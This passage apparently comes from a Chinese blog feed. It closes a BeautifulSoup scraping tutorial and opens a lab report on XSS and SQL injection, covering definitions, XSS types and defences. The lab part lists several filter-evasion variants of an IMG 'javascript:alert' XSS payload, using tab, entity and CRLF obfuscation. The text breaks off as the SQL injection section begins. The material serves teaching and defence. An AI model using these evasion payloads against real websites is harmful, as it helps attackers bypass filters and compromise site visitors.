b</span></span><br></pre></td></tr></table></figure><p><strong>&lt;3&gt; 传列表</strong></p><p>如果传入列表参数,Beautiful Soup会将与列表中任一元素匹配的内容返回.下面代码找到文档中所有&lt;a&gt;标签和&lt;b&gt;标签</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">soup.find_all([<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>])</span><br><span class="line"><span class="comment"># [&lt;b&gt;The Dormouse&#x27;s story&lt;/b&gt;,</span></span><br><span class="line"><span class="comment">#  &lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;,</span></span><br><span class="line"><span class="comment">#  &lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;,</span></span><br><span class="line"><span class="comment">#  &lt;a class=&quot;sister&quot; href=&quot;http://example.com/tillie&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;]</span></span><br></pre></td></tr></table></figure><h4 id="1-2-keyword-参数"><a href="#1-2-keyword-参数" class="headerlink" title="1.2 keyword 参数"></a>1.2 <strong>keyword 参数</strong></h4><p>如果一个指定名字的参数不是搜索内置的参数名,搜索时会把该参数当作指定名字tag的属性来搜索,如果包含一个名字为 <code>id</code> 的参数,Beautiful Soup会搜索每个tag的”id”属性.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">soup.find_all(<span class="built_in">id</span>=<span class="string">&#x27;link2&#x27;</span>)</span><br><span class="line"><span class="comment"># [&lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="comment"># 超链接包含elsie标签</span></span><br><span class="line"><span class="built_in">print</span>(soup.find_all(href=re.<span class="built_in">compile</span>(<span class="string">&quot;elsie&quot;</span>)))</span><br><span class="line"><span class="comment"># [&lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;]</span></span><br><span class="line"><span class="comment"># 以The作为开头的字符串</span></span><br><span class="line"><span class="built_in">print</span>(soup.find_all(text=re.<span class="built_in">compile</span>(<span class="string">&quot;^The&quot;</span>))) </span><br><span class="line"><span class="comment"># [&quot;The Dormouse&#x27;s story&quot;, &quot;The Dormouse&#x27;s story&quot;]</span></span><br><span class="line"><span class="comment"># class选择器包含st的节点</span></span><br><span class="line"><span class="built_in">print</span>(soup.find_all(class_=re.<span class="built_in">compile</span>(<span class="string">&quot;st&quot;</span>)))</span><br></pre></td></tr></table></figure><p>搜索指定名字的属性时可以使用的参数值包括 字符串 , 正则表达式 , 列表, True .</p><p>下面的例子在文档树中查找所有包含 <code>id</code> 属性的tag,无论 <code>id</code> 的值是什么:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">soup.find_all(<span class="built_in">id</span>=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># [&lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;,</span></span><br><span class="line"><span class="comment">#  &lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;,</span></span><br><span class="line"><span class="comment">#  &lt;a class=&quot;sister&quot; href=&quot;http://example.com/tillie&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;]</span></span><br></pre></td></tr></table></figure><p>使用多个指定名字的参数可以同时过滤tag的多个属性:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">soup.find_all(href=re.<span class="built_in">compile</span>(<span class="string">&quot;elsie&quot;</span>), <span class="built_in">id</span>=<span class="string">&#x27;link1&#x27;</span>)</span><br><span class="line"><span class="comment"># [&lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;three&lt;/a&gt;]</span></span><br></pre></td></tr></table></figure><p>在这里我们想用 class 过滤，不过 class 是 python 的关键词，这怎么办？加个下划线就可以</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(soup.find_all(<span class="string">&quot;a&quot;</span>, class_=<span class="string">&quot;sister&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">[&lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;,</span></span><br><span class="line"><span class="string">&lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;,</span></span><br><span class="line"><span class="string">&lt;a class=&quot;sister&quot; href=&quot;http://example.com/tillie&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;</span></span><br><span class="line"><span class="string">]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>通过 <code>find_all()</code> 方法的 <code>attrs</code> 参数定义一个字典参数来搜索包含特殊属性的tag:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data_soup.find_all(attrs=&#123;<span class="string">&quot;data-foo&quot;</span>: <span class="string">&quot;value&quot;</span>&#125;)</span><br><span class="line"><span class="comment"># [&lt;div data-foo=&quot;value&quot;&gt;foo!&lt;/div&gt;]</span></span><br></pre></td></tr></table></figure><p>注意：如何查看条件id和class同时存在时的写法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(soup.find_all(<span class="string">&#x27;b&#x27;</span>, class_=<span class="string">&quot;story&quot;</span>, <span class="built_in">id</span>=<span class="string">&quot;x&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(soup.find_all(<span class="string">&#x27;b&#x27;</span>, attrs=&#123;<span class="string">&quot;class&quot;</span>:<span class="string">&quot;story&quot;</span>, <span class="string">&quot;id&quot;</span>:<span class="string">&quot;x&quot;</span>&#125;))</span><br></pre></td></tr></table></figure><h4 id="1-3-text-参数"><a href="#1-3-text-参数" class="headerlink" title="1.3  text 参数"></a>1.3  <strong>text 参数</strong></h4><p>通过 <code>text</code> 参数可以搜搜文档中的字符串内容.与 <code>name</code> 参数的可选值一样, <code>text</code> 参数接受 字符串 , 正则表达式 , 列表, True</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(soup.find_all(text=<span class="string">&quot;Elsie&quot;</span>))</span><br><span class="line"><span class="comment"># [&#x27;Elsie&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(soup.find_all(text=[<span class="string">&quot;Tillie&quot;</span>, <span class="string">&quot;Elsie&quot;</span>, <span class="string">&quot;Lacie&quot;</span>]))</span><br><span class="line"><span class="comment"># [&#x27;Elsie&#x27;, &#x27;Lacie&#x27;, &#x27;Tillie&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 只要包含Dormouse就可以</span></span><br><span class="line"><span class="built_in">print</span>(soup.find_all(text=re.<span class="built_in">compile</span>(<span class="string">&quot;Dormouse&quot;</span>)))</span><br><span class="line"><span class="comment"># [&quot;The Dormouse&#x27;s story&quot;, &quot;The Dormouse&#x27;s story&quot;]</span></span><br></pre></td></tr></table></figure><h4 id="1-4-limit-参数"><a href="#1-4-limit-参数" class="headerlink" title="1.4 limit 参数"></a>1.4 <strong>limit 参数</strong></h4><p><code>find_all()</code> 方法返回全部的搜索结构,如果文档树很大那么搜索会很慢.如果我们不需要全部结果,可以使用 <code>limit</code> 参数限制返回结果的数量.效果与SQL中的limit关键字类似,当搜索到的结果数量达到 <code>limit</code> 的限制时,就停止搜索返回结果.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(soup.find_all(<span class="string">&quot;a&quot;</span>,limit=<span class="number">2</span>))</span><br><span class="line"><span class="built_in">print</span>(soup.find_all(<span class="string">&quot;a&quot;</span>)[<span class="number">0</span>:<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">[&lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;, </span></span><br><span class="line"><span class="string">&lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="2、find"><a href="#2、find" class="headerlink" title="2、find()"></a>2、find()</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find( name , attrs , recursive , string , **kwargs )</span><br></pre></td></tr></table></figure><p><code>find_all()</code> 方法将返回文档中符合条件的所有tag,尽管有时候我们只想得到一个结果.比如文档中只有一个&lt;body&gt;标签,那么使用 <code>find_all()</code> 方法来查找&lt;body&gt;标签就不太合适, 使用 <code>find_all</code> 方法并设置 <code>limit=1</code> 参数不如直接使用 <code>find()</code> 方法.下面两行代码是等价的:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">soup.find_all(<span class="string">&#x27;title&#x27;</span>, limit=<span class="number">1</span>)</span><br><span class="line"><span class="comment"># [&lt;title&gt;The Dormouse&#x27;s story&lt;/title&gt;]</span></span><br><span class="line"></span><br><span class="line">soup.find(<span class="string">&#x27;title&#x27;</span>)</span><br><span class="line"><span class="comment"># &lt;title&gt;The Dormouse&#x27;s story&lt;/title&gt;</span></span><br></pre></td></tr></table></figure><p>唯一的区别是 <code>find_all()</code> 方法的返回结果是值包含一个元素的列表,而 <code>find()</code> 方法直接返回结果.</p><p><code>find_all()</code> 方法没有找到目标是返回空列表, <code>find()</code> 方法找不到目标时,返回 <code>None</code> .</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(soup.find(<span class="string">&quot;nosuchtag&quot;</span>))</span><br><span class="line"><span class="comment"># None</span></span><br></pre></td></tr></table></figure><p><code>soup.head.title</code> 是 tag的名字 方法的简写.这个简写的原理就是多次调用当前tag的 <code>find()</code> 方法:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">soup.head.title</span><br><span class="line"><span class="comment"># &lt;title&gt;The Dormouse&#x27;s story&lt;/title&gt;</span></span><br><span class="line"></span><br><span class="line">soup.find(<span class="string">&quot;head&quot;</span>).find(<span class="string">&quot;title&quot;</span>)</span><br><span class="line"><span class="comment"># &lt;title&gt;The Dormouse&#x27;s story&lt;/title&gt;</span></span><br></pre></td></tr></table></figure><h2 id="四、beautifulsoup的css选择器"><a href="#四、beautifulsoup的css选择器" class="headerlink" title="四、beautifulsoup的css选择器"></a>四、beautifulsoup的css选择器</h2><p>我们在写 CSS 时，标签名不加任何修饰，类名前加点，id名前加 #，在这里我们也可以利用类似的方法来筛选元素，用到的方法是 <strong>soup.select()，</strong>返回类型是 <strong>list</strong></p><h3 id="1、通过标签名查找"><a href="#1、通过标签名查找" class="headerlink" title="1、通过标签名查找"></a>1、通过标签名查找</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(soup.select(<span class="string">&quot;title&quot;</span>))  <span class="comment">#[&lt;title&gt;The Dormouse&#x27;s story&lt;/title&gt;]</span></span><br><span class="line"><span class="built_in">print</span>(soup.select(<span class="string">&quot;b&quot;</span>))      <span class="comment">#[&lt;b&gt;The Dormouse&#x27;s story&lt;/b&gt;]</span></span><br></pre></td></tr></table></figure><h3 id="2、通过类名查找"><a href="#2、通过类名查找" class="headerlink" title="2、通过类名查找"></a>2、通过类名查找</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(soup.select(<span class="string">&quot;.sister&quot;</span>)) </span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">[&lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;, </span></span><br><span class="line"><span class="string">&lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;, </span></span><br><span class="line"><span class="string">&lt;a class=&quot;sister&quot; href=&quot;http://example.com/tillie&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="3、id名查找"><a href="#3、id名查找" class="headerlink" title="3、id名查找"></a>3、id名查找</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(soup.select(<span class="string">&quot;#link1&quot;</span>))</span><br><span class="line"><span class="comment"># [&lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;]</span></span><br></pre></td></tr></table></figure><h3 id="4、组合查找"><a href="#4、组合查找" class="headerlink" title="4、组合查找"></a>4、组合查找</h3><p>组合查找即和写 class 文件时，标签名与类名、id名进行的组合原理是一样的，例如查找 p 标签中，id 等于 link1的内容，二者需要用空格分开</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(soup.select(<span class="string">&quot;p #link2&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#[&lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;]</span></span><br></pre></td></tr></table></figure><p>直接子标签查找</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(soup.select(<span class="string">&quot;p &gt; #link2&quot;</span>))</span><br><span class="line"><span class="comment"># [&lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;]</span></span><br></pre></td></tr></table></figure><p>查找既有class也有id选择器的标签</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a_string = soup.select(&quot;.story#test&quot;)</span><br></pre></td></tr></table></figure><p>查找有多个class选择器的标签</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a_string = soup.select(&quot;.story.test&quot;)</span><br></pre></td></tr></table></figure><p>查找有多个class选择器和一个id选择器的标签</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a_string = soup.select(&quot;.story.test#book&quot;)</span><br></pre></td></tr></table></figure><h3 id="5、属性查找"><a href="#5、属性查找" class="headerlink" title="5、属性查找"></a>5、属性查找</h3><p>查找时还可以加入属性元素，属性需要用中括号括起来，注意属性和标签属于同一节点，所以中间不能加空格，否则会无法匹配到。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(soup.select(<span class="string">&quot;a[href=&#x27;http://example.com/tillie&#x27;]&quot;</span>))</span><br><span class="line"><span class="comment">#[&lt;a class=&quot;sister&quot; href=&quot;http://example.com/tillie&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;]</span></span><br></pre></td></tr></table></figure><p>select 方法返回的结果都是列表形式，可以遍历形式输出，然后用 get_text() 方法来获取它的内容：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> title <span class="keyword">in</span> soup.select(<span class="string">&#x27;a&#x27;</span>):</span><br><span class="line">    <span class="built_in">print</span> (title.get_text())</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Elsie</span></span><br><span class="line"><span class="string">Lacie</span></span><br><span class="line"><span class="string">Tillie</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
          <category> python </category>
          
          <category> 爬虫 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实验三 XSS和SQL注入</title>
      <link href="/2023/12/24/%E5%AE%9E%E9%AA%8C%E4%B8%89XSS%E5%92%8CSQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/12/24/%E5%AE%9E%E9%AA%8C%E4%B8%89XSS%E5%92%8CSQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="实验三-XSS和SQL注入"><a href="#实验三-XSS和SQL注入" class="headerlink" title="实验三 XSS和SQL注入"></a>实验三 XSS和SQL注入</h1><h2 id="实验目的和要求"><a href="#实验目的和要求" class="headerlink" title="实验目的和要求"></a>实验目的和要求</h2><p>实验目的：了解什么是XSS；了解XSS攻击实施，理解防御XSS攻击的方法；了解SQL注入的基本原理；掌握PHP脚本访问MySQL数据库的基本方法；掌握程序设计中避免出现SQL注入漏洞的基本方法；掌握网站配置。</p><p>系统环境：Kali Linux 2、Windows Server</p><p>网络环境：交换网络结构</p><p>实验工具： Beef；AWVS(Acunetix Web Vulnarability Scanner);SqlMAP；DVWA</p><p>实验原理：</p><p>XSS </p><p>1、什么是XSS</p><p>XSS又叫CSS (Cross Site Script) 也称为跨站，它是指攻击者利用网站程序对用户输入过滤不足，输入可以显示在页面上对其他用户造成影响的HTML代码，从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。</p><p>2 、什么是XSS攻击 </p><p>XSS攻击是指入侵者在远程WEB页面的HTML代码中插入具有恶意目的的数据，用户认为该页面是可信赖的，但是当浏览器下载该页面，嵌入其中的脚本将被解释执行,由于HTML语言允许使用脚本进行简单交互，入侵者便通过技术手段在某个页面里插入一个恶意HTML代码，例如记录论坛保存的用户信息（Cookie），由于Cookie保存了完整的用户名和密码资料，用户就会遭受安全损失。如这句简单的Java脚本就能轻易获取用户信息：alert(document.cookie)，它会弹出一个包含用户信息的消息框。入侵者运用脚本就能把用户信息发送到他们自己的记录页面中，稍做分析便获取了用户的敏感信息。</p><p>3、 什么是Cookie</p><p>Cookie，有时也用其复数形式Cookies，指某些网站为了辨别用户身份、进行session跟踪而储存在用户本地终端上的数据（通常经过加密）。定义于RFC2109（已废弃），最新取代的规范是RFC2965。Cookie最早是网景公司的前雇员Lou Montulli在1993年3月的发明。</p><p>Cookie是由服务器端生成，发送给User-Agent（一般是浏览器），浏览器会将Cookie的key&#x2F;value保存到某个目录下的文本文件内，下次请求同一网站时就发送该Cookie给服务器（前提是浏览器设置为启用Cookie）。Cookie名称和值可以由服务器端开发自己定义，对于JSP而言也可以直接写入jsessionid，这样服务器可以知道该用户是否为合法用户以及是否需要重新登录等。</p><p>4、XSS漏洞的分类</p><p>存储型 XSS：交互形Web应用程序出现后，用户就可以将一些数据信息存储到Web服务器上，例如像网络硬盘系统就允许用户将自己计算机上的文件存储到网络服务器上，然后与网络上的其他用户一起分享自己的文件信息。这种接收用户信息的Web应用程序由于在使用上更加贴近用户需求，使用灵活，使得其成为现代化Web领域的主导。在这些方便人性化的背后也带来了难以避免的安全隐患。</p><p>如果有某个Web应用程序的功能是负责将用户提交的数据存储到数据库中，然后在需要时将这个用户提交的数据再从数据库中提取出返回到网页中，在这个过程中，如果用户提交的数据中包含一个XSS攻击语句，一旦Web应用程序准备将这个攻击语句作为用户数据返回到网页中，那么所有包含这个回显信息的网页将全部受到XSS漏洞的影响，也就是说只要一个用户访问了这些网页中的任何一个，他都会遭受到来自该Web应用程序的跨站攻击。Web应用程序过于相信用户的数据，将其作为一个合法信息保存在数据库中，这等于是将一个定时炸弹放进了程序的内部，只要时机一到，这颗定时炸弹就会爆炸。这种因为存储外部数据而引发的XSS漏洞称为Web应用程序的Stored XSS漏洞，即存储型XSS漏洞。</p><p>存储型XSS漏洞广泛出现在允许Web用户自定义显示信息及允许Web用户上传文件信息的Web应用程序中，大部分的Web应用程序都属于此类。有一些Web应用程序虽然也属于此类，但是由于该Web应用程序只接受单个管理员的用户数据，而管理员一般不会对自己的Web应用程序做什么破坏，所以这种Web应用程序也不会遭到存储型XSS漏洞的攻击。</p><p>DOM-Based XSS漏洞： DOM是Document Object Model（文档对象模型）的缩写。根据W3C DOM规范（<a href="http://www.w.org.dom/%EF%BC%89,DOM%E6%98%AF%E4%B8%80%E7%A7%8D%E4%B8%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E3%80%81%E5%B9%B3%E5%8F%B0%E3%80%81%E8%AF%AD%E8%A8%80%E6%97%A0%E5%85%B3%E7%9A%84%E6%8E%A5%E5%8F%A3%EF%BC%8C%E4%BD%BF%E5%BE%97%E7%BD%91%E9%A1%B5%E5%BC%80%E5%8F%91%E8%80%85%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E5%AE%83%E6%9D%A5%E8%AE%BF%E9%97%AE%E9%A1%B5%E9%9D%A2%E5%85%B6%E4%BB%96%E7%9A%84%E6%A0%87%E5%87%86%E7%BB%84%E4%BB%B6%E3%80%82%E7%AE%80%E5%8D%95%E8%A7%A3%E9%87%8A%EF%BC%8CDOM%E8%A7%A3%E5%86%B3%E4%BA%86Netscape%E7%9A%84JavaScript%E5%92%8CMicrosoft%E7%9A%84JScrtipt%E4%B9%8B%E9%97%B4%E7%9A%84%E5%86%B2%E7%AA%81%EF%BC%8C%E7%BB%99%E4%BA%88Web%E8%AE%BE%E8%AE%A1%E5%B8%88%E5%92%8C%E5%BC%80%E5%8F%91%E8%80%85%E4%B8%80%E4%B8%AA%E6%A0%87%E5%87%86%E7%9A%84%E6%96%B9%E6%B3%95%EF%BC%8C%E8%AE%A9%E4%BB%96%E4%BB%AC%E6%9D%A5%E8%AE%BF%E9%97%AE%E4%BB%96%E4%BB%AC%E7%AB%99%E7%82%B9%E4%B8%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E3%80%81%E8%84%9A%E6%9C%AC%E5%92%8C%E8%A1%A8%E7%8E%B0%E5%B1%82%E5%AF%B9%E8%B1%A1%E3%80%82">http://www.w.org.DOM/）,DOM是一种与浏览器、平台、语言无关的接口，使得网页开发者可以利用它来访问页面其他的标准组件。简单解释，DOM解决了Netscape的JavaScript和Microsoft的JScrtipt之间的冲突，给予Web设计师和开发者一个标准的方法，让他们来访问他们站点中的数据、脚本和表现层对象。</a></p><p>​    由于DOM有如此好的功能，大量的Web应用程序开发者在自己的程序中加入对DOM的支持，令人遗憾的是,Web应用程序开发者这种滥用DOM的做法使得Web应用程序的安全也大大降低，DOM-Based XSS正是在这样的环境下出现的漏洞。DOM-Based XSS漏洞与Stored XSS漏洞不同，因为他甚至不需要将XSS攻击语句存入到数据库中，直接在浏览器的地址栏中就可以让Web应用程序发生跨站行为。对于大多数的Web应用程序来说，这种类型的XSS漏洞是最容易被发现和利用的。</p><p>反射型XSS：仅对当次的页面访问产生影响。使得用户访问一个被攻击者篡改后的链接(包含恶意脚本)，用户访问该链接时，被植入的攻击脚本被用户浏览器执行，从而达到攻击目的。</p><p>5、XSS的防御</p><p>5.1基于特征的防御</p><p>XSS漏洞利用了Web页面的编写不完善，所以每一个漏洞所利用和针对的弱点都不尽相同。这就给XSS漏洞防御带来了困难：不可能以单一特征来概括所有XSS攻击。</p><p>传统XSS防御多采用特征匹配方式，在所有提交的信息中都进行匹配检查。对于这种类型的XSS攻击，采用的模式匹配方法一般会需要对“javascript”这个关键字进行检索，一旦发现提交信息中包含“javascript”，就认定为XSS攻击。这种检测方法的缺陷显而易见：黑客可以通过插入字符或完全编码的方式躲避检测。</p><p>（1） 在javascript中加入多个tab键，得到 IMG SRC&#x3D;”jav ascript:alert(‘XSS‘)” 。</p><p>（2） 在javascript中加入#x09编码字符，得到 IMG SRC&#x3D;”javascript:alert(‘XSS‘)” 。</p><p>（3） 在javascript中加入字符，得到 IMG SRC&#x3D;”javascript:alert(‘XSS‘)” 。</p><p>（4） 在javascript中的每个字符间加入回车换行符，得到 IMG SRC&#x3D;”j\r\na\r\nv\r\n\r\na\r\ns\r\nc\r\nr\r\ni\r\np\r\nt\r\n:alert(‘XSS‘)”。</p><p>（5） 对”javascript:alert(‘XSS‘)”采用完全编码，得到 </p><p>IMGSRC&#x3D;#x6A#x61#x76#x61#x73#x63#x72#x69#x70#x74#x3A#x61#x6C#x65#x72#x74#x28#x27#x58#x53#x53#x27#x29。</p><p>上述方法都可以很容易的躲避基于特征的检测。而除了会有大量的漏报外，基于特征的还存在大量的误报可能：在上面的例子中，对”<a href="http://www.target.com/javascript/kkk.asp?id=2345%22%E8%BF%99%E6%A0%B7%E4%B8%80%E4%B8%AAURL%EF%BC%8C%E7%94%B1%E4%BA%8E%E5%8C%85%E5%90%AB%E4%BA%86%E5%85%B3%E9%94%AE%E5%AD%97%E2%80%9Cjavascript%E2%80%9D%EF%BC%8C%E4%B9%9F%E5%B0%86%E4%BC%9A%E8%A7%A6%E5%8F%91%E6%8A%A5%E8%AD%A6%E3%80%82">http://www.target.com/javascript/kkk.asp?id=2345&quot;这样一个URL，由于包含了关键字“javascript”，也将会触发报警。</a></p><p>基于代码修改的防御</p><p>还有一种方法就是从Web应用开发的角度来避免：</p><p>（1） 对所有用户提交内容进行可靠的输入验证，包括对URL、查询关键字、HTTP头、POST数据等，仅接受指定长度范围内、采用适当格式、采用所预期的字符的内容来提交，对其他的一律过滤。</p><p>（2） 实现Session标记（session tokens）、CAPTCHA系统或者HTTP引用头检查，以防被攻击 。</p><p>SQL注入攻击</p><p>1、什么是SQL注入攻击</p><p>所谓SQL注入式攻击，就是攻击者把SQL命令插入到Web表单的输入域或页面请求的查询字符串，欺骗服务器执行恶意的SQL命令。</p><p>2、为何会有SQL注入攻击</p><p>很多电子商务应用程序都使用数据库来存储信息。不论是产品信息，账目信息还是其它类型的数据，数据库都是Web应用环境中非常重要的环节。SQL命令就是前端Web和后端数据库之间的接口，使得数据可以传递到Web应用程序，也可以从其中发送出来。需要对这些数据进行控制，保证用户只能得到授权给他的信息。可是，很多Web站点都会利用用户输入的参数动态的生成SQL查询要求，攻击者通过在URL、表格域，或者其他的输入域中输入自己的SQL命令，以此改变查询属性，骗过应用程序，从而可以对数据库进行不受限的访问。</p><p>因为SQL查询经常用来进行验证、授权、订购、打印清单等，所以，允许攻击者任意提交SQL查询请求是非常危险的。通常，攻击者可以不经过授权，使用SQL输入从数据库中获取信息。</p><p>3． 